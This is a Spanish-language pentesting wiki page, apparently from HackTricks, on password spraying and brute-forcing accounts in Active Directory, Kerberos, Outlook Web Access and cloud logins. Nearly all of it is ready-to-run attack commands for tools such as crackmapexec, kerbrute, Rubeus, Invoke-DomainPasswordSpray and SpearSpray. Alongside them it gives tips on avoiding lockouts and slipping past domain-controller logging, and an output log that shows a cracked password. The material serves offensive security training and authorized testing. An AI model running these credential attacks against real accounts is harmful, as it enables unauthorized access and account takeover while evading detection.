# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Una vez que hayas encontrado varios **valid usernames** puedes probar las **common passwords** (ten en cuenta la password policy del entorno) con cada uno de los usuarios descubiertos.\
Por **default** la **minimum** **password** **length** es **7**.

Las listas de common usernames también pueden ser útiles: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Ten en cuenta que **could lockout some accounts if you try several wrong passwords** (por defecto más de 10).

### Obtener password policy

Si tienes user credentials o un shell como domain user puedes **get the password policy with**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Explotación desde Linux (o desde cualquier sistema)

- Usando **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Usando [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(puedes indicar el número de intentos para evitar bloqueos):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Usando [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NO RECOMENDADO, A VECES NO FUNCIONA
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Con el módulo `scanner/smb/smb_login` de **Metasploit**:

![](<../../images/image (745).png>)

- Usando **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Desde Windows

- Con [Rubeus](https://github.com/Zer1t0/Rubeus) (versión con el módulo brute):
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- With [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Por defecto puede generar usuarios del dominio y obtendrá la política de contraseñas del dominio, limitando los intentos según ésta):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Con [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying con direccionamiento LDAP y limitación consciente de PSO (SpearSpray)

El spraying basado en Kerberos pre-auth reduce el ruido frente a intentos de bind SMB/NTLM/LDAP y se alinea mejor con las políticas de bloqueo de AD. SpearSpray combina direccionamiento impulsado por LDAP, un motor de patrones y conocimiento de políticas (política de dominio + PSOs + buffer de badPwdCount) para realizar spraying de forma precisa y segura. También puede etiquetar principals comprometidos en Neo4j para el pathing de BloodHound.

Ideas clave:
- Descubrimiento de usuarios vía LDAP con paginación y soporte LDAPS, opcionalmente usando filtros LDAP personalizados.
- Filtrado consciente de la política de bloqueo de dominio + PSO para dejar un buffer de intentos configurable (umbral) y evitar bloquear usuarios.
- Validación Kerberos pre-auth usando bindings gssapi rápidos (genera 4768/4771 en DCs en lugar de 4625).
- Generación de contraseñas por patrón, por usuario, usando variables como nombres y valores temporales derivados del pwdLastSet de cada usuario.
- Control de throughput con threads, jitter y max requests por segundo.
- Integración opcional con Neo4j para marcar usuarios comprometidos para BloodHound.

Uso básico y descubrimiento:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Selección de objetivos y control de patrones:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Controles de sigilo y seguridad:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound enriquecimiento:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Descripción general del sistema de patrones (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Available variables include:
- {name}, {samaccountname}
- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition helpers and org token: {separator}, {suffix}, {extra}

Operational notes:
- Prioriza consultar el PDC-emulator con -dc para leer el badPwdCount y la información relacionada con políticas más autorizada.
- Los reinicios de badPwdCount se disparan en el siguiente intento después de la ventana de observación; usa umbrales y temporización para mantenerte seguro.
- Los intentos de pre-auth de Kerberos aparecen como 4768/4771 en la telemetría del DC; usa jitter y rate-limiting para pasar desapercibido.

> Consejo: El tamaño de página LDAP por defecto de SpearSpray es 200; ajusta con -lps según sea necesario.

## Outlook Web Access

Hay múltiples herramientas para p**assword spraying outlook**.

- Con [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- con [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Con [Ruler](https://github.com/sensepost/ruler) (fiable!)
- Con [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- Con [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Para usar cualquiera de estas herramientas, necesitas una lista de usuarios y una contraseña / una pequeña lista de contraseñas para password spraying.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Referencias

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)


{{#include ../../banners/hacktricks-training.md}}
